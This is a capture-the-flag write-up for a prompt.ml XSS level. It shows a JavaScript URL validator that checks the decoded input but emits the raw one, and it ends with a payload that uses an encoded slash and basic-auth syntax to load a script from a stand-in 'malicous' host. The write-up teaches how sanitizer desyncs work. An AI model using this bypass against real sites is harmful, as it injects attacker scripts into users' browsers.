This level has a design flaw.

The level code:
```javascript
function escape(input) {
    // make sure the script belongs to own site
    // sample script: http://prompt.ml/js/test.js
    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
        var script = document.createElement('script');
        script.src = input;
        return script.outerHTML;
    } else {
        return 'Invalid resource.';
    }
}
```

The regex checks if our input starts with "prompt.ml" domain, if we want to bypass a check like this, we can probably exploit the syntax of http basic auth `http://username:password@site.com`.

And the code tests the input with URL decode funtion, but implements the input with the original value. This is where the flaw exists. There will be a potential desync of the sanitizer and the actual output.

To exploit this, we need to know what the regex does first.
Let's ignore the http part and take a look at the domain, it requires the input to be something like:
`https://prompt.ml/anything...`
Notice that the domain is followed by a slash, so we can't exploit the basic auth technique directly.
But remember that our input is actually URL decoded before the check, we can actually enter this as our input:
```
https://prompt.ml%2F:pwd@malicous.site.com/evil.js
```
Since the `%2F` will be decode to " / ", this payload can bypass the regex check and let the user link a script to a evil website!
